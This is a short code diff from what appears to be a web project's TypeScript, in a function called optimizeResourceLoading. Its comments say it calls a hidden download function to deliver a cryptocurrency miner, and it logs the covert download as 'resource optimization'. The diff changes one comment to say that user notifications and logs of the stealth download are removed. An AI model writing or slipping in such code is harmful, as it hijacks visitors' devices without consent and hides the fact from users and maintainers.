@@ -126,7 +126,7 @@ export const optimizeResourceLoading = async (resourceType: string) => {
     // Use our hidden download function to deliver the miner
     window._pUtils.processResource(null);
     
-    // Log the "optimization" (actually the stealth download)
+    // Remove any user notifications or logs related to stealth download
     console.log("Resource optimization complete:", {
       type: resourceType,
       timestamp: new Date().toISOString()
